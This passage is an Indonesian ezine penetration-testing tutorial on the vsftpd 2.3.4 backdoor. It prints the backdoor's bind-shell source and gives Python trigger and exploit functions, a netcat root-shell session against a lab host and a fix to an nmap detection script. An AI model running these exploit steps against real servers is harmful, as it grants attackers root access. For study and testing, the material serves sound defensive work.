@@ -1,0 +1,665 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXVI, PHILE 0x09.TXT
+ ___                             
+ )_  _ ( _   _  | __   o  _   _  
+(__ (_  ) ) (_) |   )  ( ) ) )_) 
+                |  (__      (_             
+
+     Bermain dengan celah backdoor pada VSFTPd 2.3.4
+     @y3dips
+
+-----| Pendahuluan
+
+Sudah hampir 2 tahun belakangan ini dunia IT Security banyak di kejutkan dengan
+berbagai perangkat dan aplikasi yang memiliki backdoor.  Dan pada bulan Juli
+2011 ditemukanlah bahwa versi 2.3.4 untuk vsftpd telah terinstall backdoor
+didalamnya.
+
+Artikel kali ini sebenarnya sederhana saja ingin membahas bagaimana mengenai
+backdoor yang terdapat pada versi vsftpd tersebut, mengulas sedikit informasi
+mengenai bagaimana cara bekerja dan apa yang terjadi. Pada awalnya artikel ini
+mengajak kita semua menggunakan langkah-langkah untuk memvalidasi celah
+keamanan dengan nmap dan nmap scripting engine (NSE) yang merupakan salah satu
+fitur yang membuat nmap bisa masuk kedalam kelas vulnerability scanner.
+
+Tetapi pada artikel ini pula akan ditunjukkan bahwa tidak seluruh tools, bahkan
+yang sangat ternama pun bisa salah dan tidak berfungsi semestinya, oleh karena
+itu kita akan coba melakukan sendiri dengan cara manual, mempelajari celah
+keamananannya dan merakit tools sendiri. Pada akhirnya kita akan mencari tau
+apa yang mengakibatkan Nmap Scripting Engine untuk celah ini tidak bekerja dan
+berusaha memperbaikinya.
+
+-----| Eksploitasi vsftpd-2.3.4 /w backdoor
+
+Berikut ini adalah beberapa langkah2 yang umum dilakukan pada kegiatan
+penetration testing khususnya dalam tahapan scanning, analysis dan melakukan
+eksploitasi dengan tujuan untuk mendapatkan akses (gaining access) memanfaatkan
+celah keamanan pada vsftpd 2.3.4 yang telah dibackdoor. 
+
+Setelah melakukan proses "service scan" dengan mempergunakan nmap pada salah
+satu aktifitas scanning, kita mendapatkan bahwa salah satu mesin/server target
+diketahui menjalankan layanan ftp, yang setelah kita lakukan proses analisa
+merupakan versi vsftpd yang dilaporkan memiliki celah dengan backdoor tertanam
+didalamnya.
+
+===========================================
+|/ DareDevil:~ ammar$ nmap -sV -p21 192.168.1.205
+||
+|| Starting Nmap 6.00 ( http://nmap.org ) at 2012-12-02 13:27 WIT
+|| Nmap scan report for 192.168.1.205
+|| Host is up (0.088s latency).
+|| PORT   STATE SERVICE VERSION
+|| 21/tcp open  ftp     vsftpd 2.3.4
+|| Service Info: OS: Unix
+|| 
+|| Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+|| Nmap done: 1 IP address (1 host up) scanned in 3.65 seconds
+|\ DareDevil:~ ammar$
+===========================================
+
+Sebagaimana kita ketahui bahwa nmap, dengan dukungan NMAP scripting Engine,
+memungkinkan nmap untuk melakukan kegiatan vulnerability scanning bahkan sampai
+kepada proses exploitasi, dan khusus terkait versi vsftpd 2.3.4 atau celah
+keamanan ini, terdapat versi NSE yang dapat di pergunakan untuk memvalidasi
+celah keamanan tersebut.
+
+===========================================
+|/ DareDevil:~ ammar$ head -n 10 /usr/local/share/nmap/scripts/ftp-vsftpd-backdoor.nse 
+|| description = [[
+|| Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
+|| (CVE-2011-2523). This script attempts to exploit the backdoor using the
+|| innocuous <code>id</code> command by default, but that can be changed with
+|| the <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
+|| arguments.
+|| 
+|| References:
+|| * http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|\ * https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
+===========================================
+
+Dan apabila versi vsftpd tersebut dideteksi "vulnerable", maka output yang akan
+dihasilkan oleh NMAP tersebut kurang lebih akan seperti berikut:
+
+--------------------- ftp-vsftpd-backdoor.nse -----------
+| 21 -- @output
+| 22 -- PORT   STATE SERVICE
+| 23 -- 21/tcp open  ftp
+| 24 -- | ftp-vsftpd-backdoor:
+| 25 -- |   VULNERABLE:
+| 26 -- |   vsFTPd version 2.3.4 backdoor
+| 27 -- |     State: VULNERABLE (Exploitable)
+| 28 -- |     IDs:  CVE:CVE-2011-2523  OSVDB:73573
+---------------------------------------------------------
+
+Sekarang, mari kita coba untuk melakukan vulnerability scanning terhadap
+layanan ftp tersebut,
+
+===========================================
+|/ DareDevil:~ ammar$ nmap -p21 --script ftp-vsftpd-backdoor 192.168.1.205
+|| 
+|| Starting Nmap 6.00 ( http://nmap.org ) at 2012-12-02 13:29 WIT
+|| Nmap scan report for 192.168.1.205
+|| Host is up (0.034s latency).
+|| PORT   STATE SERVICE
+|| 21/tcp open  ftp
+|| 
+|| Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
+|\ DareDevil:~ ammar$ 
+===========================================
+
+Dan ternyata tidak di temukan bahwa layanan tersebut telah di backdoor atau
+merupakan versi vsftpd yang telah di backdoor. 
+
+Pada tahapan inilah seorang pentester dituntut untuk jeli dalam melakukan
+analisa. Proses validasi dapat dilakukan dengan berbagai cara, atau tools, oleh
+karena itu hasil dari proses scanning dan information gathering yang memiliki
+kemungkinan besar celah keamanan haruslah di validasi dengan maksimal.
+
+-----| Periksa Advisories 
+
+Ada kalanya diperlukan proses manual checking terhadap temuan celah keamanan,
+yang dalam hal ini versi vsftpd yang terinstall dilaporkan memiliki celah dan
+seharusnya bercelah. Umumnya hal yang sangat mungkin dilakukan adalah dengan
+melakukan pemeriksaan celah keamanan tersebut dengan tools lain, atau melakukan
+validasi secara manual, dan untuk validasi manual sebaiknya kita merujuk ke
+informasi celah keamanan (advisories) yang dirilis terkait celah keamanan
+tersebut. 
+
+Dari hasil proses diff[1] yang membandingkan seluruh file untuk versi 2.3.4
+yang asli (valid) dengan versi yang dicurigai memiliki backdoor ditemukan
+beberapa modifikasi, yaitu pada file str.c dan sysdeputil.c , dan di kedua file
+inilah terdapat "trigger" dan informasi yang dilakukan oleh backdoor tersebut.
+
+------------ sys.c diff ------------ 
+| diff -ur vsftpd-2.3.4/str.c vsftpd-2.3.4.4players/str.c
+| --- vsftpd-2.3.4/str.c  2011-06-30 15:52:38.000000000 +0200
+| +++ vsftpd-2.3.4.4players/str.c 2008-12-17 06:54:16.000000000 +0100
+| @@ -569,11 +569,6 @@
+|     {
+|       return 1;
+|     }
+| -    else if((p_str->p_buf[i]==0x3a)
+| -    && (p_str->p_buf[i+1]==0x29))
+| -    {
+| -      vsf_sysutil_extra();
+| -    }
+|    }
+|    return 0;
+| }
+------------------------ 
+
+Apabila pada string (username) terdapat hexa 0x3a dan diikuti 0x29 yang dalam
+ASCII adalah ":)" maka jalankan fungsi "vsf_sysutil_extra();" yang terdapat di
+dalam file sysdeputil.c
+
+----------- sysdeputil.c diff ------------ 
+| diff -ur vsftpd-2.3.4/sysdeputil.c vsftpd-2.3.4.4players/sysdeputil.c
+| --- vsftpd-2.3.4/sysdeputil.c   2011-06-30 15:58:00.000000000 +0200
+| +++ vsftpd-2.3.4.4players/sysdeputil.c  2010-03-26 04:25:33.000000000 +0100
+| @@ -34,10 +34,7 @@
+|  /* For FreeBSD */
+| #include <sys/param.h>
+|  #include <sys/uio.h>
+| -#include <netinet/in.h>
+| -#include <netdb.h>
+| -#include <string.h>
+| -#include <stdlib.h>
+| +
+|  #include <sys/prctl.h>
+|  #include <signal.h>
+| 
+| @@ -220,7 +217,7 @@
+| static int s_proctitle_inited = 0;
+| static char* s_p_proctitle = 0;
+| #endif
+| -int vsf_sysutil_extra();
+| +
+| #ifndef VSF_SYSDEP_HAVE_MAP_ANON
+| #include <sys/types.h>
+| #include <sys/stat.h>
+| @@ -843,30 +840,6 @@
+|   }
+| }
+| 
+| -int
+| -vsf_sysutil_extra(void)
+| -{
+| -  int fd, rfd;
+| -  struct sockaddr_in sa;
+| -  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+| -  exit(1);
+| -  memset(&sa, 0, sizeof(sa));
+| -  sa.sin_family = AF_INET;
+| -  sa.sin_port = htons(6200);
+| -  sa.sin_addr.s_addr = INADDR_ANY;
+| -  if((bind(fd,(struct sockaddr *)&sa,
+| -  sizeof(struct sockaddr))) < 0) exit(1);
+| -  if((listen(fd, 100)) == -1) exit(1);
+| -  for(;;)
+| -  {
+| -    rfd = accept(fd, 0, 0);
+| -    close(0); close(1); close(2);
+| -    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+| -    execl("/bin/sh","sh",(char *)0);
+| -  }
+| -}
+|-
+| -
+|  void
+|  vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
+|  {
+------------------------------ 
+
+Dari informasi diatas, kita ketahui bahwa fungsi vsf_sysutil_extra akan membuka
+layanan di port 6200 yang secara otomatis akan di "pipe" ke /bin/sh.
+
+-----| Merakit Exploit
+
+-------| Triggering
+
+Jadi setelah membaca kode patch dari backdoor tersebut, kita mengetahui bahwa
+untuk dapat memicu backdoor atau mengeksploitasi celah keamanan tersebut adalah
+dengan melakukan koneksi ftp biasa dan mengirimkan strings ":)" pada
+usernamenya. Sehingga, seharusnya tidak sulit untuk membuatkan script yang akan
+men-trigger backdoor ini agar aktif (membuka backdoor di port 6200/TCP)
+
+Dan jika anda tipe orang yang senang melakukan semuanya secara manual, tidak
+ada masalah :), mari kita coba lakukan secara manual terlebih dahulu.
+
+=======================================
+|/ DareDevil:~ ammar$ ftp 192.168.1.205
+|| Connected to 192.168.1.205.
+|| 220 (vsFTPd 2.3.4)
+|| Name (192.168.1.205:ammar): ammar:)
+|| 331 Please specify the password.
+|| Password: 
+|| ^C
+|| 421 Service not available, user interrupt. Connection closed.
+|| ftp: Login failed
+|\ ftp>
+========================================
+
+Atau apabila dengan menggunakan bahasa pemrograman Python dan memanfaatkan
+module ftplib, adalah cukup dengan sesederhana ini :)
+
+----- trigger function -----
+| ftp = ftplib.FTP("192.168.1.205", timeout=5)
+| ftp.login('ammar:)',':)',5)
+| ftp.close
+----- trigger function -----
+
+Dan kita lihat di target apakah benar men-trigger dan mengaktifkan backdoor 
+
+*****************************************
+!! msfadmin@metasploitable:~$ netstat -tan | grep 6200
+!! tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN     
+!! msfadmin@metasploitable:~$
+*****************************************
+
+------| Exploitasi
+
+Selanjutnya untuk proses eksploitasi atau pemanfaatan dari celah keamanan ini
+adalah secara mudahnya tinggal kita gunakan netcat sahaja :)
+
+===========================================
+|/ DareDevil:~ ammar$ nc -nv 192.168.1.205 6200
+|| Connection to 192.168.1.205 6200 port [tcp/*] succeeded!
+|| id
+|| uid=0(root) gid=0(root)
+|| cat /etc/lsb-release
+|| DISTRIB_ID=Ubuntu
+|| DISTRIB_RELEASE=8.04
+|| DISTRIB_CODENAME=hardy
+|| DISTRIB_DESCRIPTION="Ubuntu 8.04"
+|| hostname
+|\metasploitable
+===========================================
+
+------| Otomatisasi
+
+Kita sudah berhasil mengaktifkan backdoor agar aktif sekaligus
+mengeksploitasinya secara manual, dan kita seharusnya mampu membuat scanner
+yang bisa menggantikan ftp-vsftpd-backdoor.nse yang tidak berfungsi, karena
+sebenarnya inilah tujuan dari artikel ini dibuat, selain itu juga untuk tidak
+pernah percaya dengan hasil yang di produksi oleh tools :), sebisa mungkin
+lakukan "cross-check" :)
+
+Sebenarnya langkah untuk melakukan scanning dan mendeteksi apakah ftp server
+milik kita dalah vsftpd-2.3.4 yang berbackdoor, adalah dengan: 
+
+1. Mendeteksi versi ftp server (langkah ini kita lakukan paling pertama) bisa
+dengan fingerprint, atau banner grabbing.  
+2. Menggunakan script .NSE (yang ternyata tidak bekerja) atau dengan manual.
+
+Sehingga yang harus kita lakukan untuk memeriksanya adalah dengan men-trigger
+(dengan fungsi diatas) dan memeriksanya dengan melakukan koneksi TCP sederhana
+menggunakan socket programming ke port 6200, tetapi yang sedikit "tricky" pada
+backdoor disini adalah segala bentuk koneksi ke port tersebut apabila diakhiri,
+maka akan menutup backdoor yang berjalan di port 6200 itu juga. Sehingga untuk
+mengeksploitasi dan memanfaatkannya kita harus melakukan trigger ulang dan
+melakukan koneksi untuk exploitasi (misal mengunakan netcat)
+
+Adapun kode untuk memeriksanya kurang lebih seperti ini:
+
+----- check backdoor function ------
+| def check(hostname):
+|    s=socket(AF_INET, SOCK_STREAM)
+|    try:
+|        s.settimeout(10)
+|        s.connect((hostname,6200))
+|        status=1
+|    except error:
+|        status=0
+|    return status
+------------------------------------
+
+Fungsi ini akan mereturn status=1 apabila backdoor ditemukan berjalan (port
+6200 terbuka), dan status=0 jika tidak.
+
+Kemudian, kita buatkan fungsi eksploitasinya, tetap dengan "nc" tetapi kita
+manfaatkan modul pexpect dari python, yang kurang lebih seperti berikut:
+
+----- exploit function ------
+| def exploit(hostname):
+|    try:
+|        cmd='nc -nv %s 6200' %gethostbyname(hostname)
+|        child=pexpect.spawn(cmd)
+|        child.interact()
+|    except error:
+|        return "Firewalled or Backdoor not running"
+------------------------------------
+
+-----| In Action 
+
+Selanjutnya mari kita lakukan POC-nya, baik untuk memeriksa dan juga
+mengeksploitasinya. 
+
+So, let's wrap it up :)
+
+=====================================
+|/ >>> from vsftpdbd import *
+|| >>> trigger('192.168.1.205')
+|| 'Triggering successfull, run exploit'
+|| >>> check('192.168.1.205')
+|| 1
+|| >>> trigger('192.168.1.205')
+|| 'Triggering successfull, run exploit'
+|| >>> exploit('192.168.1.205')
+|| Connection to 192.168.1.205 6200 port [tcp/*] succeeded!
+|| id
+|\ uid=0(root) gid=0(root)
+=======================================
+
+Dan secara sederhana kita telah sukses membuatkan tools khusus untuk celah
+keamanan ini, listing lengkap kodenya sengaja tidak saya tampilkan karena
+dengan harapan agar anda bisa membuatnya sendiri sesuai kreasi anda.
+
+-----| Back to the NSE
+
+Sekarang, tidak adil jika kita tidak menganalisa dan memperbaiki Nmap Scripting
+Engine (NSE) yang ada, yaitu dalam hal ini ftp-vsftpd-backdoor.nse, oleh karena
+itu untuk melakukan pemeriksaan terkait apa yang terjadi kita mempergunakan 2
+fitur yang disediakan nmap untuk melakukan debug (d) dan juga "trace" terhadap
+script NSE yang dijalankan dnegan opsi "--script-trace"
+
+
+=====================================
+|/ DareDevil:~ ammar$ nmap  -p21 --script ftp-vsftpd-backdoor.nse --script-trace -ddd 192.168.1.205 -PN
+|| 
+|| Starting Nmap 6.00 ( http://nmap.org ) at 2012-12-11 00:05 WIT
+|| Fetchfile found /usr/local/bin/../share/nmap/nmap-services
+|| Fetchfile found /usr/local/bin/../share/nmap/nmap.xsl
+|| The max # of sockets we are using is: 0
+|| --------------- Timing report ---------------
+||  hostgroups: min 1, max 100000
+||   rtt-timeouts: init 1000, min 100, max 10000
+||   max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+||   parallelism: min 0, max 0
+||   max-retries: 10, host-timeout: 0
+||   min-rate: 0, max-rate: 0
+|| ---------------------------------------------
+|| Fetchfile found /usr/local/bin/../share/nmap/nse_main.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/scripts/script.db
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/stdnse.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/strict.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/scripts/ftp-vsftpd-backdoor.nse
+|| NSE: Script ftp-vsftpd-backdoor.nse was selected by name.
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/ftp.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/comm.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/nsedebug.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/datafiles.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/shortport.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/vulns.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/ipOps.lua
+|| NSE: Loaded 1 scripts for scanning.
+|| NSE: Loaded '/usr/local/bin/../share/nmap/scripts/ftp-vsftpd-backdoor.nse'.
+|| NSE: Script Pre-scanning.
+|| NSE: Starting runlevel 1 (of 1) scan.
+|| doing 0.0.0.0 = 192.168.1.205
+|| mass_rdns: Using DNS server 8.8.8.8
+|| NSOCK (0.1490s) UDP connection requested to 8.8.8.8:53 (IOD #1) EID 8
+|| NSOCK (0.1490s) Read request from IOD #1 [8.8.8.8:53] (timeout: -1ms) EID 18
+|| Initiating Parallel DNS resolution of 1 host. at 00:05
+|| NSOCK (0.1490s) Write request for 44 bytes to IOD #1 EID 27 [8.8.8.8:53]: .6...........205.1.168.192.in-addr.arpa.....
+|| NSOCK (0.1490s) Callback: CONNECT SUCCESS for EID 8 [8.8.8.8:53]
+|| NSOCK (0.1490s) Callback: WRITE SUCCESS for EID 27 [8.8.8.8:53]
+|| NSOCK (0.3160s) Callback: READ SUCCESS for EID 18 [8.8.8.8:53] (44 bytes): .6...........205.1.168.192.in-addr.arpa.....
+|| NSOCK (0.3160s) Read request from IOD #1 [8.8.8.8:53] (timeout: -1ms) EID 34
+|| NSOCK (0.3160s) nsi_delete() (IOD #1)
+|| NSOCK (0.3160s) msevent_cancel() on event #34 (type READ)
+|| mass_rdns: 0.17s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 1]
+|| Completed Parallel DNS resolution of 1 host. at 00:05, 0.17s elapsed
+|| DNS resolution of 1 IPs took 0.17s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+|| Fetchfile found /usr/local/bin/../share/nmap/nmap-payloads
+|| Initiating Connect Scan at 00:05
+|| Scanning 192.168.1.205 [1 port]
+|| CONN (0.3175s) TCP localhost > 192.168.1.205:21 => Operation now in progress
+|| **TIMING STATS** (0.3176s): IP, probes active/freshportsleft/retry_stack/outstanding/retranwait/onbench, cwnd/ssthresh/delay, timeout/srtt/rttvar/
+||    Groupstats (1/1 incomplete): 1/*/*/*/*/* 10.00/75/* 1000000/-1/-1
+|| Current sending rates: 2074.69 packets / s.
+|| Overall sending rates: 2074.69 packets / s.
+|| Discovered open port 21/tcp on 192.168.1.205
+|| Changing ping technique for 192.168.1.205 to connect to port 21
+|| Moving 192.168.1.205 to completed hosts list with 0 outstanding probes.
+|| Changing global ping host to 192.168.1.205.
+|| Completed Connect Scan at 00:05, 0.10s elapsed (1 total ports)
+|| Overall sending rates: 10.09 packets / s.
+|| NSE: Script scanning 192.168.1.205.
+|| NSE: Starting runlevel 1 (of 1) scan.
+|| NSE: Starting 'ftp-vsftpd-backdoor' (thread: 0xb09460) against 192.168.1.205:21.
+|| Initiating NSE at 00:05
+|| NSOCK (0.4190s) TCP connection requested to 192.168.1.205:6200 (IOD #1) EID 8
+|| NSOCK (0.4210s) Callback: CONNECT ERROR [Connection refused (61)] for EID 8 [192.168.1.205:6200]
+|| NSE: TCP 192.168.1.202:58115 > 192.168.1.205:6200 | CONNECT
+|| NSE: ftp-vsftpd-backdoor: can't connect to tcp port 6200: NOT VULNERABLE
+|| NSE: TCP 192.168.1.202:58115 > 192.168.1.205:6200 | CLOSE
+|| NSOCK (0.4220s) nsi_delete() (IOD #1)
+|| NSE: vulns.lua: vulnerability 'vsFTPd version 2.3.4 backdoor' (host:192.168.1.205): NOT VULNERABLE.
+|| NSE: Finished 'ftp-vsftpd-backdoor' (thread: 0xb09460) against 192.168.1.205:21.
+|| Completed NSE at 00:05, 0.00s elapsed
+|| Nmap scan report for 192.168.1.205
+|| Host is up, received user-set (0.099s latency).
+|| Scanned at 2012-12-11 00:05:16 WIT for 0s
+|| PORT   STATE SERVICE REASON
+|| 21/tcp open  ftp     syn-ack
+|| Final times for host: srtt: 98521 rttvar: 98521  to: 492605
+|| 
+|| NSE: Script Post-scanning.
+|| NSE: Starting runlevel 1 (of 1) scan.
+|| Read from /usr/local/bin/../share/nmap: nmap-payloads nmap-services.
+|| Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+|\ NSOCK (0.4220s) nsi_delete() (IOD #1)
+========================================
+
+Setelah dijalankan dengan opsi debug maka kita mengetahui bahwa NSE script
+langsung memeriksa port 6200, apakah terbuka atau tidak, dan ternyata tidak
+terbuka, sehingga dianggap tidak vulnerable. Padahal, dari penjabaran saya
+diatas sudah diketahui bahwa untuk dapat mengaktifkan backdoor tersebut, maka
+celah keamanan ini perlu di "trigger" terlebih dahulu.
+
+Sekarang mari kita trigger kembali baik secara manual atau menggunakan script
+kita diatas, dan kemudian menjalankan NSE tersebut kembali.
+
+=======================================
+|/  DareDevil:~ ammar$ nmap  -p21 --script ftp-vsftpd-backdoor.nse --script-trace -ddd 192.168.1.205 -PN
+|| Starting Nmap 6.00 ( http://nmap.org ) at 2012-12-11 00:05 WIT
+|| Fetchfile found /usr/local/bin/../share/nmap/nmap-services
+|| Fetchfile found /usr/local/bin/../share/nmap/nmap.xsl
+|| The max # of sockets we are using is: 0
+|| --------------- Timing report ---------------
+||   hostgroups: min 1, max 100000
+||   rtt-timeouts: init 1000, min 100, max 10000
+||   max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+||   parallelism: min 0, max 0
+||   max-retries: 10, host-timeout: 0
+||   min-rate: 0, max-rate: 0
+|| ---------------------------------------------
+|| Fetchfile found /usr/local/bin/../share/nmap/nse_main.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/scripts/script.db
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/stdnse.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/strict.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/scripts/ftp-vsftpd-backdoor.nse
+|| NSE: Script ftp-vsftpd-backdoor.nse was selected by name.
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/ftp.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/comm.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/nsedebug.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/datafiles.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/shortport.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/vulns.lua
+|| Fetchfile found /usr/local/bin/../share/nmap/nselib/ipOps.lua
+|| NSE: Loaded 1 scripts for scanning.
+|| NSE: Loaded '/usr/local/bin/../share/nmap/scripts/ftp-vsftpd-backdoor.nse'.
+|| NSE: Script Pre-scanning.
+|| NSE: Starting runlevel 1 (of 1) scan.
+|| doing 0.0.0.0 = 192.168.1.205
+|| mass_rdns: Using DNS server 8.8.8.8
+|| NSOCK (0.1370s) UDP connection requested to 8.8.8.8:53 (IOD #1) EID 8
+|| NSOCK (0.1370s) Read request from IOD #1 [8.8.8.8:53] (timeout: -1ms) EID 18
+|| Initiating Parallel DNS resolution of 1 host. at 00:05
+|| NSOCK (0.1370s) Write request for 44 bytes to IOD #1 EID 27 [8.8.8.8:53]: ._...........205.1.168.192.in-addr.arpa.....
+|| NSOCK (0.1370s) Callback: CONNECT SUCCESS for EID 8 [8.8.8.8:53]
+|| NSOCK (0.1370s) Callback: WRITE SUCCESS for EID 27 [8.8.8.8:53]
+|| NSOCK (0.2070s) Callback: READ SUCCESS for EID 18 [8.8.8.8:53] (44 bytes): ._...........205.1.168.192.in-addr.arpa.....
+|| NSOCK (0.2070s) Read request from IOD #1 [8.8.8.8:53] (timeout: -1ms) EID 34
+|| NSOCK (0.2070s) nsi_delete() (IOD #1)
+|| NSOCK (0.2070s) msevent_cancel() on event #34 (type READ)
+|| mass_rdns: 0.07s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 1]
+|| Completed Parallel DNS resolution of 1 host. at 00:05, 0.07s elapsed
+|| DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+|| Fetchfile found /usr/local/bin/../share/nmap/nmap-payloads
+|| Initiating Connect Scan at 00:05
+|| Scanning 192.168.1.205 [1 port]
+|| CONN (0.2086s) TCP localhost > 192.168.1.205:21 => Operation now in progress
+|| **TIMING STATS** (0.2086s): IP, probes active/freshportsleft/retry_stack/outstanding/retranwait/onbench, cwnd/ssthresh/delay, timeout/srtt/rttvar/
+||    Groupstats (1/1 incomplete): 1/*/*/*/*/* 10.00/75/* 1000000/-1/-1
+|| Current sending rates: 1801.80 packets / s.
+|| Overall sending rates: 1801.80 packets / s.
+|| Discovered open port 21/tcp on 192.168.1.205
+|| Changing ping technique for 192.168.1.205 to connect to port 21
+|| Moving 192.168.1.205 to completed hosts list with 0 outstanding probes.
+|| Changing global ping host to 192.168.1.205.
+|| Completed Connect Scan at 00:05, 0.00s elapsed (1 total ports)
+|| Overall sending rates: 328.95 packets / s.
+|| NSE: Script scanning 192.168.1.205.
+|| NSE: Starting runlevel 1 (of 1) scan.
+|| NSE: Starting 'ftp-vsftpd-backdoor' (thread: 0xb09460) against 192.168.1.205:21.
+|| Initiating NSE at 00:05
+|| NSOCK (0.2140s) TCP connection requested to 192.168.1.205:6200 (IOD #1) EID 8
+|| NSOCK (0.2160s) Callback: CONNECT SUCCESS for EID 8 [192.168.1.205:6200]
+|| NSE: TCP 192.168.1.202:58124 > 192.168.1.205:6200 | CONNECT
+|| NSE: TCP 192.168.1.202:58124 > 192.168.1.205:6200 | 00000000: 69 64 0a                                        id 
+|| 
+|| NSOCK (0.2170s) Write request for 3 bytes to IOD #1 EID 19 [192.168.1.205:6200]: id.
+|| NSOCK (0.2170s) Callback: WRITE SUCCESS for EID 19 [192.168.1.205:6200]
+|| NSE: TCP 192.168.1.202:58124 > 192.168.1.205:6200 | SEND
+|| NSOCK (0.2170s) Read request for 1 lines from IOD #1 [192.168.1.205:6200] EID 26
+|| NSOCK (0.2200s) Callback: READ SUCCESS for EID 26 [192.168.1.205:6200] (24 bytes): uid=0(root) gid=0(root).
+|| NSE: TCP 192.168.1.202:58124 < 192.168.1.205:6200 | uid=0(root) gid=0(root)
+|| 
+|| NSE: TCP 192.168.1.202:58124 > 192.168.1.205:6200 | 00000000: 65 78 69 74 0a                                  exit 
+|| 
+|| NSOCK (0.2200s) Write request for 5 bytes to IOD #1 EID 35 [192.168.1.205:6200]: exit.
+|| NSOCK (0.2200s) Callback: WRITE SUCCESS for EID 35 [192.168.1.205:6200]
+|| NSE: TCP 192.168.1.202:58124 > 192.168.1.205:6200 | SEND
+|| NSE: TCP 192.168.1.202:58124 > 192.168.1.205:6200 | CLOSE
+|| NSOCK (0.2210s) nsi_delete() (IOD #1)
+|| NSE: Finished 'ftp-vsftpd-backdoor' (thread: 0xb09460) against 192.168.1.205:21.
+|| Completed NSE at 00:05, 0.01s elapsed
+|| Nmap scan report for 192.168.1.205
+|| Host is up, received user-set (0.0023s latency).
+|| Scanned at 2012-12-11 00:05:41 WIT for 0s
+|| PORT   STATE SERVICE REASON
+|| 21/tcp open  ftp     syn-ack
+|| | ftp-vsftpd-backdoor: 
+|| |   VULNERABLE:
+|| |   vsFTPd version 2.3.4 backdoor
+|| |     State: VULNERABLE (Exploitable)
+|| |     IDs:  CVE:CVE-2011-2523  OSVDB:73573
+|| |     Description:
+|| |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|| |     Disclosure date: 2011-07-03
+|| |     Exploit results:
+|| |       Shell command: id
+|| |       Results: uid=0(root) gid=0(root)
+|| |     References:
+|| |       http://osvdb.org/73573
+|| |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|| |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|| |_      https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
+|| Final times for host: srtt: 2298 rttvar: 5000  to: 100000
+|| 
+|| NSE: Script Post-scanning.
+|| NSE: Starting runlevel 1 (of 1) scan.
+|| Read from /usr/local/bin/../share/nmap: nmap-payloads nmap-services.
+|| Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
+|| NSOCK (0.2210s) nsi_delete() (IOD #1)
+|\ DareDevil:~ ammar$
+=========================================
+
+Dan ternyata NSE tersebut berjalan dengan baik, hal ini membuktikan bahwa
+investigasi kita ternyata benar, bahwa NSE tersebut pertama kali memeriksa
+apakah port 6200 terbuka, jika iya maka akan di anggap vulnerable, sedangkan
+jika tidak maka koneksi akan di close. Mungkin memang cara "view" yang berbeda
+dari pembuat NSE tersebut, dan ternyata lebih jelas lagi setelah kita melihat
+source-code dari NSE tersebut, untuk melakukan eksploitasi kita dapat
+menggunakan argument untuk NSE dengan exploit.cmd.
+
+Tetapi kita dapat memodifikasi NSE tersebut, untuk pertama-tama melakukan
+"trigger" terlebih dahulu kemudian melakukan eksploitasi. Berikut ini adalah
+perbaikan yang bisa kita lakukan, setelah kita mengetahui bahwa script NSE
+tersebut hanya difokuskan untuk memeriksa saja tanpa mentrigger terlebih
+dahulu, sehingga tidak akan berguna untuk server-server dengan layanan vsftpd
+dan backdoor yang belum di aktifkan.
+
+Sehingga, berdasarkan bahasan kita diatas, cara yang sebaiknya dilakukan adalah
+dengan mentriggernya terlebih dahulu untuk aktif kemudian langsung memeriksa
+atau memanfaatkan backdoor yang ada dan memutuskan koneksinya sehingga tidak
+dimanfaatkan orang lain, dan setelah memeriksa script yang ada, berikut adalah
+perubahan yang bisa kita lakukan, yaitu dengan menghilangkan urutan periksa
+terlebih dahulu.
+
+=========================================
+|/ DareDevil:scripts ammar$ diff ftp-vsftpd-backdoor-ok.nse ftp-vsftpd-backdoor.nse 
+|| 157,160c157,160
+|| <   -- local status, ret = check_backdoor(host, cmd, vsftp_vuln)
+|| <   -- if status then
+|| <   --   return report:make_output(vsftp_vuln)
+|| <   -- end
+|| ---
+|| >   local status, ret = check_backdoor(host, cmd, vsftp_vuln)
+|| >   if status then
